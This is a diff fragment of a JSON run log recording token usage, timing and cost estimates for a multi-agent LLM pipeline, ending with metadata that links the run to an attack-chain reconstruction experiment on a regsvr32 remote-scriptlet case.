+      "output_tokens": 6950,
+      "cached_input_tokens": 13184,
+      "total_tokens": 34054
+    },
+    "investigator": {
+      "input_tokens": 13580,
+      "output_tokens": 2738,
+      "cached_input_tokens": 7552,
+      "total_tokens": 16318
+    },
+    "sql_qa": {
+      "input_tokens": 51776,
+      "output_tokens": 3075,
+      "cached_input_tokens": 25344,
+      "total_tokens": 54851
+    },
+    "role_call_counts": {
+      "chief": 5,
+      "investigator": 5,
+      "sql_qa": 10
+    },
+    "role_llm_duration_seconds": {
+      "chief": 35.922,
+      "investigator": 18.953,
+      "sql_qa": 24.249
+    },
+    "role_calls": {
+      "chief": [
+        {
+          "run_id": "a1df675a-82f3-4516-ba40-d3742855dc8c",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 2433,
+            "output_tokens": 263,
+            "cached_input_tokens": 0,
+            "total_tokens": 2696
+          },
+          "started_at_utc": "2026-08-05T06:03:01.960656+00:00",
+          "finished_at_utc": "2026-08-05T06:03:04.795502+00:00",
+          "duration_seconds": 2.844
+        },
+        {
+          "run_id": "c3f2f034-64b5-4292-91ab-b234f0dd3ad1",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 3955,
+            "output_tokens": 450,
+            "cached_input_tokens": 2176,
+            "total_tokens": 4405
+          },
+          "started_at_utc": "2026-08-05T06:03:34.629937+00:00",
+          "finished_at_utc": "2026-08-05T06:03:38.293400+00:00",
+          "duration_seconds": 3.672
+        },
+        {
+          "run_id": "e17e379d-9d30-451d-b6fa-9cd9b6884256",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 5250,
+            "output_tokens": 1667,
+            "cached_input_tokens": 4224,
+            "total_tokens": 6917
+          },
+          "started_at_utc": "2026-08-05T06:03:52.389601+00:00",
+          "finished_at_utc": "2026-08-05T06:04:00.383771+00:00",
+          "duration_seconds": 7.984
+        },
+        {
+          "run_id": "3742d227-a453-4759-8fe8-20892a318ab2",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 7796,
+            "output_tokens": 312,
+            "cached_input_tokens": 6784,
+            "total_tokens": 8108
+          },
+          "started_at_utc": "2026-08-05T06:04:00.387773+00:00",
+          "finished_at_utc": "2026-08-05T06:04:03.339255+00:00",
+          "duration_seconds": 2.953
+        },
+        {
+          "run_id": "2e59dd1b-9d56-48db-825e-fb8ec1640aa9",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 7670,
+            "output_tokens": 4258,
+            "cached_input_tokens": 0,
+            "total_tokens": 11928
+          },
+          "started_at_utc": "2026-08-05T06:04:03.342255+00:00",
+          "finished_at_utc": "2026-08-05T06:04:21.814725+00:00",
+          "duration_seconds": 18.469
+        }
+      ],
+      "investigator": [
+        {
+          "run_id": "7dfe9eea-29f0-487f-82cf-43b13090f011",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 2062,
+            "output_tokens": 150,
+            "cached_input_tokens": 0,
+            "total_tokens": 2212
+          },
+          "started_at_utc": "2026-08-05T06:03:04.812510+00:00",
+          "finished_at_utc": "2026-08-05T06:03:06.260452+00:00",
+          "duration_seconds": 1.453
+        },
+        {
+          "run_id": "25397a38-4e26-4d17-9425-cd1be7043f3d",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 3029,
+            "output_tokens": 306,
+            "cached_input_tokens": 2176,
+            "total_tokens": 3335
+          },
+          "started_at_utc": "2026-08-05T06:03:17.293486+00:00",
+          "finished_at_utc": "2026-08-05T06:03:19.673437+00:00",
+          "duration_seconds": 2.375
+        },
+        {
+          "run_id": "6324dfc8-99b9-40b7-a098-f2187633bb9d",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 3730,
+            "output_tokens": 1249,
+            "cached_input_tokens": 3200,
+            "total_tokens": 4979
+          },
+          "started_at_utc": "2026-08-05T06:03:26.543560+00:00",
+          "finished_at_utc": "2026-08-05T06:03:34.624934+00:00",
+          "duration_seconds": 8.078
+        },
+        {
+          "run_id": "a451ab85-d934-47bb-afbd-282f87fa523b",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 2010,
+            "output_tokens": 246,
+            "cached_input_tokens": 0,
+            "total_tokens": 2256
+          },
+          "started_at_utc": "2026-08-05T06:03:38.311405+00:00",
+          "finished_at_utc": "2026-08-05T06:03:40.740915+00:00",
+          "duration_seconds": 2.422
+        },
+        {
+          "run_id": "8655eb0b-b4f6-4249-9f3f-640972073eaf",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 2749,
+            "output_tokens": 787,
+            "cached_input_tokens": 2176,
+            "total_tokens": 3536
+          },
+          "started_at_utc": "2026-08-05T06:03:47.770202+00:00",
+          "finished_at_utc": "2026-08-05T06:03:52.384605+00:00",
+          "duration_seconds": 4.625
+        }
+      ],
+      "sql_qa": [
+        {
+          "run_id": "6c06831d-f847-4785-88a0-6eb8fb0c2882",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 2109,
+            "output_tokens": 162,
+            "cached_input_tokens": 1664,
+            "total_tokens": 2271
+          },
+          "started_at_utc": "2026-08-05T06:03:06.290458+00:00",
+          "finished_at_utc": "2026-08-05T06:03:07.950697+00:00",
+          "duration_seconds": 1.672
+        },
+        {
+          "run_id": "1eae5b7e-214e-40ef-8924-47de4a8e9c5d",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 2287,
+            "output_tokens": 177,
+            "cached_input_tokens": 2176,
+            "total_tokens": 2464
+          },
+          "started_at_utc": "2026-08-05T06:03:07.962730+00:00",
+          "finished_at_utc": "2026-08-05T06:03:09.648436+00:00",
+          "duration_seconds": 1.672
+        },
+        {
+          "run_id": "f7eea3c5-73f1-4e14-9556-2f80eb82450c",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 2480,
+            "output_tokens": 177,
+            "cached_input_tokens": 2176,
+            "total_tokens": 2657
+          },
+          "started_at_utc": "2026-08-05T06:03:09.661437+00:00",
+          "finished_at_utc": "2026-08-05T06:03:11.077898+00:00",
+          "duration_seconds": 1.422
+        },
+        {
+          "run_id": "aca3fd40-54e5-404c-afa8-c00612c9baee",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 7546,
+            "output_tokens": 148,
+            "cached_input_tokens": 2176,
+            "total_tokens": 7694
+          },
+          "started_at_utc": "2026-08-05T06:03:11.274316+00:00",
+          "finished_at_utc": "2026-08-05T06:03:12.707480+00:00",
+          "duration_seconds": 1.437
+        },
+        {
+          "run_id": "339c7131-80a6-47c7-abcf-7faa8819b191",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 15282,
+            "output_tokens": 808,
+            "cached_input_tokens": 7296,
+            "total_tokens": 16090
+          },
+          "started_at_utc": "2026-08-05T06:03:12.728010+00:00",
+          "finished_at_utc": "2026-08-05T06:03:17.289488+00:00",
+          "duration_seconds": 4.562
+        },
+        {
+          "run_id": "02f1a0bd-355d-4f03-8d22-c04d29b76462",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 2115,
+            "output_tokens": 371,
+            "cached_input_tokens": 1664,
+            "total_tokens": 2486
+          },
+          "started_at_utc": "2026-08-05T06:03:19.692441+00:00",
+          "finished_at_utc": "2026-08-05T06:03:23.521818+00:00",
+          "duration_seconds": 3.828
+        },
+        {
+          "run_id": "be29bf95-f375-4021-a10b-1e7d49e65ef2",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 10795,
+            "output_tokens": 386,
+            "cached_input_tokens": 2176,
+            "total_tokens": 11181
+          },
+          "started_at_utc": "2026-08-05T06:03:23.645689+00:00",
+          "finished_at_utc": "2026-08-05T06:03:26.538569+00:00",
+          "duration_seconds": 2.89
+        },
+        {
+          "run_id": "7c41f79b-5449-42ab-a5d9-61505701fc6b",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 2111,
+            "output_tokens": 182,
+            "cached_input_tokens": 1664,
+            "total_tokens": 2293
+          },
+          "started_at_utc": "2026-08-05T06:03:40.754923+00:00",
+          "finished_at_utc": "2026-08-05T06:03:42.524719+00:00",
+          "duration_seconds": 1.766
+        },
+        {
+          "run_id": "9ebcbdaa-3611-4a58-9d8d-b7f00c7b5ddd",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 2399,
+            "output_tokens": 180,
+            "cached_input_tokens": 2176,
+            "total_tokens": 2579
+          },
+          "started_at_utc": "2026-08-05T06:03:42.558245+00:00",
+          "finished_at_utc": "2026-08-05T06:03:44.352344+00:00",
+          "duration_seconds": 1.781
+        },
+        {
+          "run_id": "65486bdf-c58f-4cb5-bd7f-36d8dd45aba2",
+          "model": "gpt-5.4-mini-2026-03-17",
+          "usage": {
+            "input_tokens": 4652,
+            "output_tokens": 484,
+            "cached_input_tokens": 2176,
+            "total_tokens": 5136
+          },
+          "started_at_utc": "2026-08-05T06:03:44.553917+00:00",
+          "finished_at_utc": "2026-08-05T06:03:47.765199+00:00",
+          "duration_seconds": 3.219
+        }
+      ]
+    },
+    "role_total": {
+      "input_tokens": 92460,
+      "output_tokens": 12763,
+      "cached_input_tokens": 46080,
+      "total_tokens": 105223
+    },
+    "call_ledger_total": {
+      "input_tokens": 92460,
+      "output_tokens": 12763,
+      "cached_input_tokens": 46080,
+      "total_tokens": 105223
+    },
+    "unattributed": {
+      "input_tokens": 0,
+      "output_tokens": 0,
+      "cached_input_tokens": 0,
+      "total_tokens": 0
+    },
+    "legacy_parent_graph_messages": {
+      "input_tokens": 19308,
+      "output_tokens": 6638,
+      "cached_input_tokens": 6400,
+      "total_tokens": 25946
+    },
+    "callback_aggregate_total": {
+      "input_tokens": 92460,
+      "output_tokens": 12763,
+      "cached_input_tokens": 46080,
+      "total_tokens": 105223
+    },
+    "full_pipeline_by_model": {
+      "gpt-5.4-mini-2026-03-17": {
+        "input_tokens": 92460,
+        "output_tokens": 12763,
+        "cached_input_tokens": 46080,
+        "total_tokens": 105223
+      }
+    },
+    "full_pipeline_calls": [
+      {
+        "run_id": "a1df675a-82f3-4516-ba40-d3742855dc8c",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2433,
+          "output_tokens": 263,
+          "cached_input_tokens": 0,
+          "total_tokens": 2696
+        },
+        "started_at_utc": "2026-08-05T06:03:01.960656+00:00",
+        "finished_at_utc": "2026-08-05T06:03:04.795502+00:00",
+        "duration_seconds": 2.844
+      },
+      {
+        "run_id": "7dfe9eea-29f0-487f-82cf-43b13090f011",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2062,
+          "output_tokens": 150,
+          "cached_input_tokens": 0,
+          "total_tokens": 2212
+        },
+        "started_at_utc": "2026-08-05T06:03:04.812510+00:00",
+        "finished_at_utc": "2026-08-05T06:03:06.260452+00:00",
+        "duration_seconds": 1.453
+      },
+      {
+        "run_id": "6c06831d-f847-4785-88a0-6eb8fb0c2882",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2109,
+          "output_tokens": 162,
+          "cached_input_tokens": 1664,
+          "total_tokens": 2271
+        },
+        "started_at_utc": "2026-08-05T06:03:06.290458+00:00",
+        "finished_at_utc": "2026-08-05T06:03:07.950697+00:00",
+        "duration_seconds": 1.672
+      },
+      {
+        "run_id": "1eae5b7e-214e-40ef-8924-47de4a8e9c5d",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2287,
+          "output_tokens": 177,
+          "cached_input_tokens": 2176,
+          "total_tokens": 2464
+        },
+        "started_at_utc": "2026-08-05T06:03:07.962730+00:00",
+        "finished_at_utc": "2026-08-05T06:03:09.649437+00:00",
+        "duration_seconds": 1.672
+      },
+      {
+        "run_id": "f7eea3c5-73f1-4e14-9556-2f80eb82450c",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2480,
+          "output_tokens": 177,
+          "cached_input_tokens": 2176,
+          "total_tokens": 2657
+        },
+        "started_at_utc": "2026-08-05T06:03:09.661437+00:00",
+        "finished_at_utc": "2026-08-05T06:03:11.077898+00:00",
+        "duration_seconds": 1.422
+      },
+      {
+        "run_id": "aca3fd40-54e5-404c-afa8-c00612c9baee",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 7546,
+          "output_tokens": 148,
+          "cached_input_tokens": 2176,
+          "total_tokens": 7694
+        },
+        "started_at_utc": "2026-08-05T06:03:11.274316+00:00",
+        "finished_at_utc": "2026-08-05T06:03:12.708481+00:00",
+        "duration_seconds": 1.437
+      },
+      {
+        "run_id": "339c7131-80a6-47c7-abcf-7faa8819b191",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 15282,
+          "output_tokens": 808,
+          "cached_input_tokens": 7296,
+          "total_tokens": 16090
+        },
+        "started_at_utc": "2026-08-05T06:03:12.728010+00:00",
+        "finished_at_utc": "2026-08-05T06:03:17.289488+00:00",
+        "duration_seconds": 4.562
+      },
+      {
+        "run_id": "25397a38-4e26-4d17-9425-cd1be7043f3d",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 3029,
+          "output_tokens": 306,
+          "cached_input_tokens": 2176,
+          "total_tokens": 3335
+        },
+        "started_at_utc": "2026-08-05T06:03:17.293486+00:00",
+        "finished_at_utc": "2026-08-05T06:03:19.673437+00:00",
+        "duration_seconds": 2.375
+      },
+      {
+        "run_id": "02f1a0bd-355d-4f03-8d22-c04d29b76462",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2115,
+          "output_tokens": 371,
+          "cached_input_tokens": 1664,
+          "total_tokens": 2486
+        },
+        "started_at_utc": "2026-08-05T06:03:19.692441+00:00",
+        "finished_at_utc": "2026-08-05T06:03:23.521818+00:00",
+        "duration_seconds": 3.828
+      },
+      {
+        "run_id": "be29bf95-f375-4021-a10b-1e7d49e65ef2",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 10795,
+          "output_tokens": 386,
+          "cached_input_tokens": 2176,
+          "total_tokens": 11181
+        },
+        "started_at_utc": "2026-08-05T06:03:23.645689+00:00",
+        "finished_at_utc": "2026-08-05T06:03:26.538569+00:00",
+        "duration_seconds": 2.89
+      },
+      {
+        "run_id": "6324dfc8-99b9-40b7-a098-f2187633bb9d",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 3730,
+          "output_tokens": 1249,
+          "cached_input_tokens": 3200,
+          "total_tokens": 4979
+        },
+        "started_at_utc": "2026-08-05T06:03:26.543560+00:00",
+        "finished_at_utc": "2026-08-05T06:03:34.624934+00:00",
+        "duration_seconds": 8.078
+      },
+      {
+        "run_id": "c3f2f034-64b5-4292-91ab-b234f0dd3ad1",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 3955,
+          "output_tokens": 450,
+          "cached_input_tokens": 2176,
+          "total_tokens": 4405
+        },
+        "started_at_utc": "2026-08-05T06:03:34.629937+00:00",
+        "finished_at_utc": "2026-08-05T06:03:38.293400+00:00",
+        "duration_seconds": 3.672
+      },
+      {
+        "run_id": "a451ab85-d934-47bb-afbd-282f87fa523b",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2010,
+          "output_tokens": 246,
+          "cached_input_tokens": 0,
+          "total_tokens": 2256
+        },
+        "started_at_utc": "2026-08-05T06:03:38.311405+00:00",
+        "finished_at_utc": "2026-08-05T06:03:40.740915+00:00",
+        "duration_seconds": 2.422
+      },
+      {
+        "run_id": "7c41f79b-5449-42ab-a5d9-61505701fc6b",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2111,
+          "output_tokens": 182,
+          "cached_input_tokens": 1664,
+          "total_tokens": 2293
+        },
+        "started_at_utc": "2026-08-05T06:03:40.755924+00:00",
+        "finished_at_utc": "2026-08-05T06:03:42.525720+00:00",
+        "duration_seconds": 1.781
+      },
+      {
+        "run_id": "9ebcbdaa-3611-4a58-9d8d-b7f00c7b5ddd",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2399,
+          "output_tokens": 180,
+          "cached_input_tokens": 2176,
+          "total_tokens": 2579
+        },
+        "started_at_utc": "2026-08-05T06:03:42.558245+00:00",
+        "finished_at_utc": "2026-08-05T06:03:44.352344+00:00",
+        "duration_seconds": 1.781
+      },
+      {
+        "run_id": "65486bdf-c58f-4cb5-bd7f-36d8dd45aba2",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 4652,
+          "output_tokens": 484,
+          "cached_input_tokens": 2176,
+          "total_tokens": 5136
+        },
+        "started_at_utc": "2026-08-05T06:03:44.553917+00:00",
+        "finished_at_utc": "2026-08-05T06:03:47.765199+00:00",
+        "duration_seconds": 3.219
+      },
+      {
+        "run_id": "8655eb0b-b4f6-4249-9f3f-640972073eaf",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2749,
+          "output_tokens": 787,
+          "cached_input_tokens": 2176,
+          "total_tokens": 3536
+        },
+        "started_at_utc": "2026-08-05T06:03:47.770202+00:00",
+        "finished_at_utc": "2026-08-05T06:03:52.384605+00:00",
+        "duration_seconds": 4.625
+      },
+      {
+        "run_id": "e17e379d-9d30-451d-b6fa-9cd9b6884256",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 5250,
+          "output_tokens": 1667,
+          "cached_input_tokens": 4224,
+          "total_tokens": 6917
+        },
+        "started_at_utc": "2026-08-05T06:03:52.389601+00:00",
+        "finished_at_utc": "2026-08-05T06:04:00.383771+00:00",
+        "duration_seconds": 7.984
+      },
+      {
+        "run_id": "3742d227-a453-4759-8fe8-20892a318ab2",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 7796,
+          "output_tokens": 312,
+          "cached_input_tokens": 6784,
+          "total_tokens": 8108
+        },
+        "started_at_utc": "2026-08-05T06:04:00.387773+00:00",
+        "finished_at_utc": "2026-08-05T06:04:03.339255+00:00",
+        "duration_seconds": 2.953
+      },
+      {
+        "run_id": "2e59dd1b-9d56-48db-825e-fb8ec1640aa9",
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 7670,
+          "output_tokens": 4258,
+          "cached_input_tokens": 0,
+          "total_tokens": 11928
+        },
+        "started_at_utc": "2026-08-05T06:04:03.342255+00:00",
+        "finished_at_utc": "2026-08-05T06:04:21.814725+00:00",
+        "duration_seconds": 18.469
+      }
+    ],
+    "full_pipeline_llm_duration_seconds": 79.139,
+    "role_by_model": {
+      "chief": {
+        "gpt-5.4-mini-2026-03-17": {
+          "input_tokens": 27104,
+          "output_tokens": 6950,
+          "cached_input_tokens": 13184,
+          "total_tokens": 34054
+        }
+      },
+      "investigator": {
+        "gpt-5.4-mini-2026-03-17": {
+          "input_tokens": 13580,
+          "output_tokens": 2738,
+          "cached_input_tokens": 7552,
+          "total_tokens": 16318
+        }
+      },
+      "sql_qa": {
+        "gpt-5.4-mini-2026-03-17": {
+          "input_tokens": 51776,
+          "output_tokens": 3075,
+          "cached_input_tokens": 25344,
+          "total_tokens": 54851
+        }
+      }
+    }
+  },
+  "usage_audit": {
+    "full_pipeline_equals_role_total": true,
+    "full_pipeline_equals_call_ledger": true,
+    "callback_aggregate_equals_call_ledger": true,
+    "full_pipeline_gte_legacy_parent": true,
+    "fallback": null,
+    "usage_source": "per_call_ledger",
+    "full_pipeline_call_count": 20,
+    "role_call_count": 20,
+    "role_call_count_by_role": {
+      "chief": 5,
+      "investigator": 5,
+      "sql_qa": 10
+    },
+    "role_timed_call_count_by_role": {
+      "chief": 5,
+      "investigator": 5,
+      "sql_qa": 10
+    },
+    "full_pipeline_timed_call_count": 20
+  },
+  "cost_estimate": {
+    "currency": "USD",
+    "pricing_scope": "standard_api_text_tokens",
+    "pricing_source": "per_call_ledger",
+    "price_card_version": "openai_public_model_pages_checked_2026-07-29",
+    "requested_model": "gpt-5.4-mini",
+    "base_rates_per_1m_tokens": {
+      "input": 0.75,
+      "cached_input": 0.075,
+      "output": 4.5
+    },
+    "call_count": 20,
+    "long_context_call_count": 0,
+    "gpt55_long_context_input_threshold": null,
+    "input_cost_usd": 0.034785,
+    "cached_input_cost_usd": 0.003456,
+    "output_cost_usd": 0.0574335,
+    "total_cost_usd": 0.0956745,
+    "regional_processing_uplift_applied": false,
+    "batch_discount_applied": false,
+    "local_function_tool_fees_usd": 0.0,
+    "calls": [
+      {
+        "index": 1,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2433,
+          "output_tokens": 263,
+          "cached_input_tokens": 0,
+          "total_tokens": 2696
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.00300825
+      },
+      {
+        "index": 2,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2062,
+          "output_tokens": 150,
+          "cached_input_tokens": 0,
+          "total_tokens": 2212
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.0022215
+      },
+      {
+        "index": 3,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2109,
+          "output_tokens": 162,
+          "cached_input_tokens": 1664,
+          "total_tokens": 2271
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.00118755
+      },
+      {
+        "index": 4,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2287,
+          "output_tokens": 177,
+          "cached_input_tokens": 2176,
+          "total_tokens": 2464
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.00104295
+      },
+      {
+        "index": 5,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2480,
+          "output_tokens": 177,
+          "cached_input_tokens": 2176,
+          "total_tokens": 2657
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.0011877
+      },
+      {
+        "index": 6,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 7546,
+          "output_tokens": 148,
+          "cached_input_tokens": 2176,
+          "total_tokens": 7694
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.0048567
+      },
+      {
+        "index": 7,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 15282,
+          "output_tokens": 808,
+          "cached_input_tokens": 7296,
+          "total_tokens": 16090
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.0101727
+      },
+      {
+        "index": 8,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 3029,
+          "output_tokens": 306,
+          "cached_input_tokens": 2176,
+          "total_tokens": 3335
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.00217995
+      },
+      {
+        "index": 9,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2115,
+          "output_tokens": 371,
+          "cached_input_tokens": 1664,
+          "total_tokens": 2486
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.00213255
+      },
+      {
+        "index": 10,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 10795,
+          "output_tokens": 386,
+          "cached_input_tokens": 2176,
+          "total_tokens": 11181
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.00836445
+      },
+      {
+        "index": 11,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 3730,
+          "output_tokens": 1249,
+          "cached_input_tokens": 3200,
+          "total_tokens": 4979
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.006258
+      },
+      {
+        "index": 12,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 3955,
+          "output_tokens": 450,
+          "cached_input_tokens": 2176,
+          "total_tokens": 4405
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.00352245
+      },
+      {
+        "index": 13,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2010,
+          "output_tokens": 246,
+          "cached_input_tokens": 0,
+          "total_tokens": 2256
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.0026145
+      },
+      {
+        "index": 14,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2111,
+          "output_tokens": 182,
+          "cached_input_tokens": 1664,
+          "total_tokens": 2293
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.00127905
+      },
+      {
+        "index": 15,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2399,
+          "output_tokens": 180,
+          "cached_input_tokens": 2176,
+          "total_tokens": 2579
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.00114045
+      },
+      {
+        "index": 16,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 4652,
+          "output_tokens": 484,
+          "cached_input_tokens": 2176,
+          "total_tokens": 5136
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.0041982
+      },
+      {
+        "index": 17,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 2749,
+          "output_tokens": 787,
+          "cached_input_tokens": 2176,
+          "total_tokens": 3536
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.00413445
+      },
+      {
+        "index": 18,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 5250,
+          "output_tokens": 1667,
+          "cached_input_tokens": 4224,
+          "total_tokens": 6917
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.0085878
+      },
+      {
+        "index": 19,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 7796,
+          "output_tokens": 312,
+          "cached_input_tokens": 6784,
+          "total_tokens": 8108
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.0026718
+      },
+      {
+        "index": 20,
+        "model": "gpt-5.4-mini-2026-03-17",
+        "usage": {
+          "input_tokens": 7670,
+          "output_tokens": 4258,
+          "cached_input_tokens": 0,
+          "total_tokens": 11928
+        },
+        "long_context_pricing": false,
+        "input_multiplier": 1.0,
+        "output_multiplier": 1.0,
+        "estimated_cost_usd": 0.0249135
+      }
+    ]
+  },
+  "finished_at_utc": "2026-08-05T06:04:21.934245+00:00",
+  "elapsed_seconds": 82.594,
+  "atlasv2_s3_s4_attack8_paired_experiment": {
+    "suite_group": "atlasv2_s3_s4_attack8_process_chain_v5_formal",
+    "contract_version": "process_behavior_chain_normal23_parity_v5_formal",
+    "case_file": "C:\\Users\\komat\\OneDrive\\Desktop\\ATLAS以外のデータセット\\data\\current_experiment\\cases\\atlasv2_s3_s4_attack8_process_chain_v5_formal_stage_cases_20260727.jsonl",
+    "chain_id": "s3_pt_02_regsvr32_remote_sct",
+    "stage": "stage3",
+    "gold": "C:\\Users\\komat\\OneDrive\\Desktop\\ATLAS以外のデータセット\\data\\current_experiment\\gold\\atlasv2_s3_s4_attack8_process_chain_v5_formal_gold_20260727\\by_chain\\s3_pt_02_regsvr32_remote_sct\\chain_gold.json",
+    "copied_from": "C:\\Users\\komat\\OneDrive\\Desktop\\ATLAS以外のデータセット\\data\\current_experiment\\runs\\clouseau_reconstruction_outputs\\20260805T060259Z_s3_pt_02_regsvr32_remote_sct_stage3_gpt-5.4-mini_official\\run.json"
+  }
+}
